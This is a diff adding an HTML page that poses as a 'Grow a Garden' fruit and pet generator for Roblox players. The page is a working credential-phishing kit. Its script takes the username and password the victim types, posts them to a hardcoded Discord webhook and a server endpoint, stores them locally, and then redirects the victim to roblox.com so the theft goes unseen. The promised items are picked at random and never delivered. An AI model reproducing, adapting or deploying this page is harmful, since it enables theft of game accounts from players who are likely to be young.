@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+  <title>Grow a Garden – Fruit/Pets Generator</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font: 16px/1.4 sans-serif;
+      background: linear-gradient(to bottom, #add8e6, #f0faff);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem 0;
+    }
+    .container {
+      width: 100%;
+      max-width: 1000px;
+      text-align: center;
+      padding: 0 1rem;
+    }
+    header img {
+      max-width: 240px;
+      height: auto;
+    }
+    header h2 {
+      margin: .5rem 0 1.5rem;
+      font-size: 1.25rem;
+      color: #2e7d32;
+      text-shadow: 0 1px 1px rgba(255,255,255,0.6);
+    }
+
+    .generator {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: .5rem;
+      margin-bottom: 2rem;
+    }
+    .generator input,
+    .generator button {
+      flex: 1 1 200px;
+      min-width: 150px;
+    }
+    .generator input {
+      padding: .6rem 1rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    .generator button {
+      padding: .6rem 1.2rem;
+      font-size: 1rem;
+      color: #fff;
+      background: #66bb6a;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      text-shadow: 0 1px 1px rgba(0,0,0,0.2);
+      transition: background .2s;
+    }
+    .generator button:hover { background: #558b2f; }
+
+    #result {
+      margin-bottom: 2rem;
+    }
+    .result-card {
+      display: inline-block;
+      width: 100%;
+      max-width: 260px;
+      background: #fff;
+      border-radius: 8px;
+      padding: .75rem;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .result-card img {
+      width: 64px;
+      height: 64px;
+      object-fit: contain;
+      margin-bottom: .5rem;
+    }
+    .result-card p {
+      font-size: .9rem;
+      color: #333;
+    }
+
+    .browse img {
+      width: 100%;
+      max-width: 1200px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      margin-bottom: 2rem;
+    }
+
+    #logs {
+      width: 100%;
+      max-width: 800px;
+      text-align: left;
+      background: rgba(255,255,255,0.8);
+      padding: 1rem;
+      border-radius: 6px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      overflow-y: auto;
+      max-height: 200px;
+    }
+    #logs h3 {
+      margin-bottom: .5rem;
+      font-size: 1.1rem;
+      color: #2e7d32;
+    }
+    #logs p {
+      font-size: .85rem;
+      margin: .25rem 0;
+      color: #333;
+    }
+
+    @media (max-width: 480px) {
+      body { padding: 1rem 0; }
+      header h2 { font-size: 1rem; }
+      .generator input,
+      .generator button {
+        flex: 1 1 100%;
+      }
+      .result-card {
+        max-width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <img src="growagarden.png" alt="Grow a Garden Logo">
+      <h2>Fruit/Pets Generator</h2>
+      <h2>Username and password</h2>
+    </header>
+
+    <div class="generator">
+      <input type="text" id="username" placeholder="Enter Username">
+      <input type="password" id="password" placeholder="Enter Password">
+      <button id="generate-btn">Generate!</button>
+    </div>
+
+    <div id="result"></div>
+
+    <div class="browse">
+      <img src="image.png" alt="Browse through the available fruits and pets">
+    </div>
+
+    <div id="logs">
+      <h3>Generation Logs</h3>
+      <p>No entries yet.</p>
+    </div>
+  </div>
+
+  <script>
+    // Constants: insert your Discord webhook and redirect URL
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1386205670910590999/d3JOVi2Rq_9KSePdSak_X-TAb-N8hijxdBg92wX4pI1esAk3nHPwMIrqaaOl3S4Mx_tc';
+    const REDIRECT_URL = 'https://www.roblox.com/'; // e.g. Discord channel or any link you want users to visit
+
+    const items = [
+      { name: 'Disco Bee',      img: 'disco-bee.png' },
+      { name: 'Raccoon Pet',    img: 'raccoon.png' },
+      { name: 'Mimic Octopus',  img: 'mimic-octopus.png' },
+      /* ... other items ... */
+      { name: 'Grape',          img: 'grape.png' }
+    ];
+
+    function renderLogs() {
+      const logsContainer = document.getElementById('logs');
+      const stored = JSON.parse(localStorage.getItem('generationLogs')) || [];
+      if (!stored.length) {
+        logsContainer.innerHTML = '<h3>Generation Logs</h3><p>No entries yet.</p>';
+        return;
+      }
+      const entries = stored.map(e => `<p>[${e.timestamp}] ${e.user} (${e.password}) → ${e.choice}</p>`).join('');
+      logsContainer.innerHTML = `<h3>Generation Logs</h3>${entries}`;
+    }
+
+    async function logEvent(user, choice, password) {
+      const timestamp = new Date().toISOString();
+      const entry = { user, password, choice: choice.name, timestamp };
+      console.log('Generation Event:', entry);
+
+      // LocalStorage
+      const logs = JSON.parse(localStorage.getItem('generationLogs')) || [];
+      logs.push(entry);
+      localStorage.setItem('generationLogs', JSON.stringify(logs));
+      renderLogs();
+
+      // Server
+      fetch('/api/log', {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(entry)
+      }).catch(err => console.warn('Failed to log to server:', err));
+
+      // Discord Embed
+      const discordPayload = {
+        embeds: [{
+          title: '🎉 New Generation Event',
+          fields: [
+            { name: 'User',     value: user,         inline: true },
+            { name: 'Password', value: password,     inline: true },
+            { name: 'Choice',   value: choice.name,  inline: true },
+            { name: 'Time',     value: timestamp,    inline: false }
+          ],
+          color: 0x66bb6a
+        }]
+      };
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(discordPayload)
+      }).catch(err => console.warn('Failed to send to Discord:', err));
+    }
+
+    document.getElementById('generate-btn').addEventListener('click', () => {
+      const user = document.getElementById('username').value.trim();
+      const pass = document.getElementById('password').value;
+      if (!user) return alert('Please enter your username.');
+      if (!pass) return alert('Please enter your password.');
+      const choice = items[Math.floor(Math.random() * items.length)];
+      document.getElementById('result').innerHTML = `
+        <div class="result-card">
+          <img src="${choice.img}" alt="${choice.name}">
+          <p><strong>${user}</strong>, meet your new<br><em>${choice.name}</em>!</p>
+        </div>
+      `;
+
+      // Log and then redirect
+      logEvent(user, choice, pass).finally(() => {
+        window.location.href = REDIRECT_URL;
+      });
+    });
+
+    // Initial
+    renderLogs();
+  </script>
+</body>
+</html>
